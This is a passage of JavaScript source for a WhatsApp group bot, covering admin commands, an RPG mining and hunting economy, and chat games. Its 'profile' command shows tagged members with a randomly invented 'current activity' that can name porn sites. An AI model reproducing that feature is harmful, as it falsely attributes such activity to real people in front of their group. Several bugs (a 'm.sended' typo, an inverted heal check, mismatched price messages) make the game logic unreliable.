			        await SkyzeeBOT.sendMessage(m.chat, { audio: audio[Math.floor(Math.random() * audio.length)], mimetype: 'audio/mp4', ptt: true }, m)     
				} else if (command === 'add') await SkyzeeBOT.groupParticipantsUpdate(m.chat, [users], 'add')
				else if (command === 'promote') await SkyzeeBOT.groupParticipantsUpdate(m.chat, [users], 'promote')
				else if (command === 'demote') await SkyzeeBOT.groupParticipantsUpdate(m.chat, [users], 'demote')
			} break

		    case 'setname': onlyGroup(); requireAdmin(); onlyAdmin(); noQ('No se especificó el nuevo nombre'); {
				await SkyzeeBOT.groupUpdateSubject(m.chat, q) } break

			case 'setdesc': onlyGroup(); requireAdmin(); onlyAdmin(); noQ('No se especificó la nueva descripción'); {
	                await SkyzeeBOT.groupUpdateDescription(m.chat, q) } break

			case 'setimg': onlyGroup(); onlyAdmin(); {
                if (!/image/.test(mime) && !/webp/.test(mime)) return replyErr(`No se adjuntó una imagen`)
                let media = await quoted.download()
                await SkyzeeBOT.updateProfilePicture(m.chat, media)
                replySuccess(mess.success)
			} break

            case 'tagall': onlyGroup(); requireAdmin(); onlyAdmin(); {
				let teks = `╚»˙·٠•●♥ Tag All ♥●•٠·˙«╝\n\n➲ *Message : ${q ? q : 'no message'}*\n\n`
				for (let mem of participants) { teks += `${themeemoji} @${mem.id.split('@')[0]}\n` }
				SkyzeeBOT.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
			} break

			case 'hidetag': onlyGroup(); onlyAdmin(); {
				SkyzeeBOT.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m }) } break

               case 'group': onlyGroup(); requireAdmin(); onlyAdmin(); {
                if (args[0] === 'close'){
                    await SkyzeeBOT.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Successful Closing The Group`)).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await SkyzeeBOT.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Successful Opening The Group`)).catch((err) => reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: `${prefix}group open`, buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: `${prefix}group close`, buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `Group Mode`, SkyzeeBOT.user.name, m)
                if (notButtons) await SkyzeeBOT.sendText(m.chat, `Group Mode\n\n${prefix}group open\n${prefix}group close`, m, {footer: SkyzeeBOT.user.name})
             }
            } break
            case 'editinfo': onlyGroup(); requireAdmin(); onlyAdmin(); {
             if (args[0] === 'open'){
                await SkyzeeBOT.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await SkyzeeBOT.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Closed Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: `${prefix}editinfo open`, buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: `${prefix}editinfo close`, buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                     if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `Mode Edit Info`, SkyzeeBOT.user.name, m)
                     if (notButtons) await SkyzeeBOT.sendText(m.chat, `Mode Edit Info\n\n${buttons[0].buttonId}\n${buttons[1].buttonId}`, m, {footer: SkyzeeBOT.user.name})
            }
            } break

case 'antiwagc': case 'antiwapc': case 'antiyt': case 'antiig': case 'antifb': case 'antitg': case 'antitt': case 'antitwt': case 'antidocs': case 'antitoxic': case 'antiflood': case 'antilinks': case 'autoreply': case 'autosticker': case 'xplevel': case 'nsfw': case 'notbuttons': onlyAdmin(); requireAdmin(); {
    antiLink(args[0], command) } break

             case 'mute': onlyGroup(); onlyAdmin(); {
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return reply(`Previously Active`)
                db.data.chats[m.chat].mute = true
                reply(`${SkyzeeBOT.user.name} Has Been Muted In This Group !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return reply(`Previously Inactive`)
                db.data.chats[m.chat].mute = false
                reply(`${SkyzeeBOT.user.name} Has Been Unmuted In This Group!`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                if (!notButtons) await SkyzeeBOT.sendButtonText(m.chat, buttons, `Mute Bot`, SkyzeeBOT.user.name, m)
                if (notButtons) await SkyzeeBOT.sendText(m.chat, `Mute Bot\n\n${buttons[0].buttonId}\n${buttons[1].buttonId}`, m, {footer: SkyzeeBOT.user.name})
                }
             } break


	case 'ephemeral': case 'temporalmsg': onlyGroup(); requireAdmin(); onlyAdmin(); {
		if (!text) return replay(`Enter The enable/disable Values`)
		if (args[0] === 'enable') {
		    await SkyzeeBOT.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
		} else if (args[0] === 'disable') {
		    await SkyzeeBOT.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
		}
	} break

// user cmd

		case 'react': {
			await SkyzeeBOT.sendMessage(m.chat, { react: { text: q, key: m.key }})
		} break

            case 'owner': {
                SkyzeeBOT.sendContact(m.chat, global.owner, m)
            } break
        	
        	case 'banlist': {        } break
        	
            case 'profile': {
                // if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
                // if (!isInventory){ addInventori(m.sender) }
                // if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
                let usuario = m.sender
                if (m.mentionedJid[0]) usuario = m.mentionedJid[0]
                else if (q) usuario = q + '@s.whatsapp.net'
                let fakeActivity = pickRandom(['Discord', 'XVIDEOS', 'Instagram', 'Fortnite', 'PORNHUB', 'Spotify', 'Plato', 'Gachalife', 'Free Fire', 'WhatsApp'])
                let nacionality = nacionalityNumber(usuario)
                try {
                    ppimg = await SkyzeeBOT.profilePictureUrl(usuario, 'image')
                    bio_user = await SkyzeeBOT.fetchStatus(usuario)
                } catch {
                    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    bio_user = '[StatusNotFound]'
                }
                buffer = await getBuffer(ppimg)
                teksehmazeh =
`*「 ❝@${usuario.split("@")[0]}❞ 」*

\`\`\`★ ╒• 𝙿𝙴𝚁𝚂𝙾𝙽𝙰𝙻 •╕ ★\`\`\`
• 𝙽𝚘𝚖𝚋𝚛𝚎: _${SkyzeeBOT.getName(usuario)}_
• 𝙱𝚒𝚘𝚐𝚛𝚊𝚏í𝚊: _${bio_user.status}_
• 𝙿𝚊í𝚜: _${nacionality}_
• 𝙰𝚌𝚝𝚒𝚟𝚒𝚍𝚊𝚍 𝚊𝚌𝚝𝚞𝚊𝚕: _${fakeActivity}_
\`\`\`★ • ✩ • ★\`\`\`

\`\`\`★ ╒• 𝚇𝙿 𝙻𝙴𝚅𝙴𝙻 •╕ ★\`\`\`
• 𝚃𝚘𝚝𝚊𝚕: _${getLevelingXp(usuario)}xp (lvl. ${getLevelingLevel(usuario)})_
• 𝚁𝚊𝚗𝚐𝚘: ${getRole(getLevelingLevel(usuario))}
\`\`\`★ • ✩ • ★\`\`\`

\`\`\`★ ╒• 𝙸𝙽𝚅𝙴𝙽𝚃𝙾𝚁𝚈 •╕ ★\`\`\`
• ❤️ ${getDarah(usuario)}
• ◻️️ ${getBesi(usuario)}
• 🟨 ${getEmas(usuario)}
• 💎 ${getEmerald(usuario)}
• 🧪 ${getPotion(usuario)}
• ⏺️Limit : ${getLimit(usuario)}
\`\`\`★ • ✩ • ★\`\`\`

\`\`\`★ ╒• 𝙷𝚄𝙽𝚃 •╕ ★\`\`\`
• 🐟 ${getIkan(usuario)}
• 🐔 ${getAyam(usuario)}
• 🐇 ${getKelinci(usuario)}
• 🐑 ${getDomba(usuario)}
• 🐄 ${getSapi(usuario)}
• 🐘 ${getGajah(usuario)}
\`\`\`★ • ✩ • ★\`\`\``
            await SkyzeeBOT.sendImage(from, buffer, teksehmazeh, m, {footer: `© ${botname}`, contextInfo: { mentionedJid: [usuario] }})
            } break

            case 'leaderboard':
            {
                let txt = `「 *LEADERBOARD* 」\n\n`
                for (let i of _buruan) {
                    txt += `➸ *ID :* ${i.id}\n`
                    txt += `*🐟Fish* : ${i.ikan}\n`
                    txt += `*🐔Chicken* : ${i.ayam}\n`
                    txt += `*🐇Rabbit* : ${i.kelinci}\n`
                    txt += `*🐑Sheep* : ${i.domba}\n`
                    txt += `*🐄Cow* : ${i.sapi}\n`
     txt += `*🐘Elephant* : ${i.gajah}\n\n`
     }
    reply(txt)       
  }
 break


 // economy cmd
case 'mining': case 'mine':{
if (q.includes('--help')) return reply(examkosong) 
    if (!m.isGroup) return reply(mess.group)
  if (!isInventory){ addInventori(m.sender) }
  if (isCekDarah < 1) return reply(`You're Tired!, Try To Heal Using Potions`) 
  let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
  let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
  let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
  var besinya = besi[Math.floor(Math.random() * besi.length)]  
  var emasnya = emas[Math.floor(Math.random() * emas.length)]  
  var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
  setTimeout( () => {
  let caption = `[ MINING RESULT ]\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
  let buttons = [
      {
       buttonId: `${prefix + command}`, 
       buttonText: {
        displayText: 'Mine Again⛏️'
      }, type: 1},
    ]
    let buttonMessage = {
      image: { url: './storage/image/tambang.jpg' },
      caption: caption,
      footer: pushname,
      buttons: buttons,
      headerType: 4
    }
    if (notButtons) delete buttonMessage.buttons
     SkyzeeBOT.sendMessage(from, buttonMessage, { quoted: m })
   
   }, 7000)  
  setTimeout( () => {
  reply(`@${m.sender.split("@")[0]} Started Mining🎣`)     
  }, 1500)
  kurangDarah(m.sender, 10)
  addBesi(m.sender, besinya)
  addEmas(m.sended, emasnya)
  addEmerald(m.sender, emeraldnya)	     
  }   
  break  
  //transaction\\
 case 'beli': case 'buy':{
if (q.includes('--help')) return reply(examkosong) 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return replyerr(`What Do You Want To Buy?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)
 var anu = args[1]
  if (args[0] === 'potion'){
  let noh = 100000 * anu
 if (!args[1]) return replyerr(`Example : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return replyerr('Your Remaining Money Is Not Sufficient For This Purchase')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Potion* : ${getPotion(m.sender)}`)
  }, 2000) 
 } else 
 if (args[0] === 'baitfood'){
  let noh = 5000 * anu
 if (!args[1]) return replyerr(`Example : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return replyerr('Your Remaining Money Is Not Sufficient For This Purchase')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Bait Food* : ${getUmpan(m.sender)}`)
  }, 2000) 
  } else 
  if (args[0] === 'limit'){
  let noh = 35000 * anu
 if (!args[1]) return replyerr(`Example : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return replyerr('Your Remaining Money Is Not Sufficient For This Purchase')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
  }, 2000) 
  } else { replyerr("Incorrect Format!") }
 }
 break
 case 'sell': case 'jual':{
 if (!q) return replyerr(`What Do You Want To Sell??\nExample : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return replyerr(`You Don't Have Enough Fish(es) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
 let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Remaining Fish(es)* : ${getIkan(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return replyerr(`You Don't Have Enough Chicken(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
 let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Remaining Chicken* : ${getAyam(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return replyerr(`You Don't Have Enough Rabbit(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
 let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Remaining Rabbit(s)* : ${getKelinci(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return replyerr(`You Don't Have Enough Sheep(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
 let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Remaining Sheep(s)* : ${getDomba(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return replyerr(`You Don't Have Enough Cow(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Remaining Cow(s)* : ${getSapi(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return replyerr(`You Don't Have Enough Elephant(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Remaining Elephant(s)* : ${getGajah(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return replyerr(`You Don't Have Enough Iron(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*Your Remaining Iron(s)* : ${getBesi(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return replyerr(`You Don't Have Enough Gold(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Money* : ${getMonay(m.sender)}\n*Your Remaining Gold(s)* : ${getEmas(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return replyerr(`You Don't Have Enough Emerald(s) For This Transaction`)
 if (!args[1]) return replyerr(`Example : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  reply(`Transaction Successful ✔️\n*Your Remaining Money* : ${getMonay(m.sender)}\n*You Don't Have Enough Emerald(s) For This Transaction* : ${getEmerald(m.sender)}`)
  }, 2000) 
 } else { replyerr("Incorrect Format!") }

 }
 break

 case 'heal':{
if (q.includes('--help')) return reply(examkosong) 
 if (!isCekDarah < 1) return replyerr('You Can Only Heal When Your Blood Is 0')
 if (isCekDarah > 100) return replyerr('Your Blood Is Full')
 if (isPotion < 1) return replyerr(`You Don't Have A Potion, Try Buying It This Way #buypotion _amount_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Success! Your Bood Is Full')
 }
 break
 case 'hunt': case 'hunting': {
if (q.includes('--help')) return reply(examkosong) 
    if (!m.isGroup) return replay(mess.group)
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return replyerr('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
  let luka = ["Pierced by a thorn while hunting","Slipped into the abyss while hunting","Scratched by a wild animal","Not careful","Entangled in roots","Fall while hunting"]
  let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
   var ikanmu = Math.ceil(Math.random() * 10)
   var ayam = Math.ceil(Math.random() * 8)
   var kelinci = Math.ceil(Math.random() * 7)
   var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
   var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
   var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
   var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
   var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
   var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
   var lukanya = luka[Math.floor(Math.random() * luka.length)]
   var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Jungle') {
    var image = './storage/image/rimba.jpg'
   } else
 if (lokasinya === 'Amazon forest') {
    var image =  './storage/image/amazon.jpg'
   } else
 if (lokasinya === 'Tropical forest') {
    var image = './storage/image/tropis.jpg'
   } else
 if (lokasinya === 'Meadow') {
    var image = './storage/image/padang_rumput.jpg'
   } else
 if (lokasinya === 'African forest') {
    var image = './storage/image/afrika.jpg'
   } else
 if (lokasinya === 'Mountains') {
   var image = './storage/image/pegunungan.jpg'
   }
 setTimeout( () => {
  let teksehmazeh = `_[ HUNT RESULT ]_\n`
     teksehmazeh += `*🐟Fish* : ${ikanmu}\n`
     teksehmazeh += `*🐔Chicken* : ${ayam}\n`
     teksehmazeh += `*🐇Rabbit* : ${kelinci}\n`
     teksehmazeh += `*🐑Sheep* : ${domba}\n`
     teksehmazeh += `*🐄Cow* : ${sapi}\n`
     teksehmazeh += `*🐘Elephant* : ${gajah}\n\n`
     teksehmazeh += `_[ INFO ]_\n`
     teksehmazeh += `*Location* : ${lokasinya}\n`
     teksehmazeh += `*Wounded* : ${lukanya}, blood - 10\n`
     teksehmazeh += `*Remaining blood* : ${getDarah(m.sender)}\n`
    let buttons = [
      {
       buttonId: `${prefix + command}`, 
       buttonText: {
        displayText: 'Hunt Again️🏹'
      }, type: 1},
    ]
    let buttonMessage = {
      image: { url: image },
      caption: teksehmazeh,
      footer: pushname,
      buttons: buttons,
      headerType: 4
     }
     if (notButtons) delete buttonMessage.buttons
     SkyzeeBOT.sendMessage(from, buttonMessage, { quoted: m })      
  }, 5000)  
 setTimeout( () => {
  reply(`@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`)     
  }, 1000) 
 addIkan(m.sender, ikanmu) 
   addAyam(m.sender, ayam) 
   addKelinci(m.sender, kelinci)
   addDomba(m.sender, domba)
   addSapi(m.sender, sapi)
  addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break

	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Has Gone Afk/Offline${text ? ': ' + text : ''}`)
            }
            break	
    case 'level': case 'xp':
                    if (!m.isGroup) return reply(mess.group)
                    const userLevel = getLevelingLevel(m.sender)
                    const userXp = getLevelingXp(m.sender)
                    if (userLevel === undefined && userXp === undefined) return reply(mess.error)
                    const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
                    resul = `◪ *ʟᴇᴠᴇʟ*\n  ├─ ► 𝗡𝗮𝗺𝗲 : ${pushname}\n  ├─ ► 𝗥𝗮𝗻𝗸 : ${roleUser}\n  ├─ ► 𝗫𝗣 : ${userXp}/${requiredXp}\n  └─ ► 𝗟𝗲𝘃𝗲𝗹 : ${userLevel}\n`
                    SkyzeeBOT.sendText(from, resul, m)
                    .catch(async (err) => {
                    await replyerr(`Error!\n${err}`)
                    })
    break
    case 'levelusers': {
        if (!isCreator) return reply(mess.owner)
        txtt = fs.readFileSync('./lib/rpg/leveluser.json')
        await SkyzeeBOT.sendText("5492996557871-1596940074@g.us", txtt)
    } break

// games
        case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replay(`You Are Still In The Game`)
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            reply('Partner found!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room.x !== room.o) await SkyzeeBOT.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await SkyzeeBOT.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            reply('Esperando rival...' + (text ? ` Type The Command Below ${prefix + command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            SkyzeeBOT.sendText(m.chat, `Successfully Deleted The TicTacToe Session`, m)
            } else if (!this.game) {
            reply(`TicTacToe🎮 Session Does Not Exist`)
            } else reply('?')
            } catch (e) {
            reply('Damaged')
            }
            }
            break
            case 'suitpvp': case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) return replay(`Complete Your Previous Suit`)
                if (m.mentionedJid[0] === m.sender) return reply(`Can't Play With Myself !`)
                if (!m.mentionedJid[0]) return reply(`_Who Do You Want To Challenge?_\nTag The Person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0])))  reply(`The Person You Are Challenging Is Playing Suit With Someone Else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} To Play Suit

Please @${m.mentionedJid[0].split`@`[0]} To Type Accept/Reject`
                this.suit[id] = {
                    chat: await SkyzeeBOT.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) SkyzeeBOT.sendText(m.chat, `_Suit Time Out_`, m)
                        delete this.suit[id]
                    }, 60000), poin, poin_lose, timeout
                }
            } break
            // case 'chat': {
            //     if (!isCreator) return replay(`${mess.owner}`)
            //     if (!q) return replay(`Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete`)
            //     if (args[0] === 'mute') {
            //         await SkyzeeBOT.chatModify({ mute: 8 }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            //     } else if (args[0] === 'clear') {
            //         SkyzeeBOT.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            //     } else if (args[0] === 'archive') {
            //         SkyzeeBOT.chatModify({ archive: true }, m.chat, m, 1000).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            //     } else if (args[0] === 'unarchive') {
            //         SkyzeeBOT.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            //     } else if (args[0] === 'read') {
            //         SkyzeeBOT.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            //     } else if (args[0] === 'unread') {
            //         SkyzeeBOT.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            //     } else if (args[0] === 'delete') {
            //         await SkyzeeBOT.chatModify({ clear: { chat: { id: m.chat, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            //     }
            // }
            // break
// 	    case 'family100': {
// 		if (isBan) return replywarn(mess.ban)	 			
// if (isBanChat) return replywarn(mess.ban)
//                 if ('family100'+m.chat in _family100) {
//                     reply('There Are Still Unfinished Sessions!')
//                     reply(false)
//                 }
//                 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
//                 let random = anu[Math.floor(Math.random() * anu.length)]
//                 let hasil = `*Answer The Following Questions :*\n${random.soal}\n\nThere Is *${random.jawaban.length}* Answer ${random.jawaban.find(v => v.includes(' ')) ? `(Some Answers Have Spaces)` : ''}`.trim()
//                 _family100['family100'+m.chat] = {
//                     id: 'family100'+m.chat,
//                     pesan: await SkyzeeBOT.sendText(m.chat, hasil, m),
//                     ...random,
//                     terjawab: Array.from(random.jawaban, () => false),
//                     hadiah: 6,
//                 }
//             }
            // break
            // case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            // if (!m.quoted && !text) return replay(`Send/Reply Text With Caption ${prefix + command}`)
            // ter = command[1].toLowerCase()
            // tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            // reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            // break
case 'guess': {
if (!args.join(" ")) return replay(`Example : ${prefix + command} song\n\nOption : \n1.song\n2. picture\n3. saying\n4. sentence\n5. lyrics\n6.food`)
if (args[0] === "song") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replay("There are still unfinished sessions!")
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await SkyzeeBOT.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
SkyzeeBOT.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
SkyzeeBOT.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'picture') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return replay("There are still unfinished sessions!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
SkyzeeBOT.sendImage(m.chat, result.img, `Please answer the question above\n\nDescription : ${result.deskripsi}\nTime : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
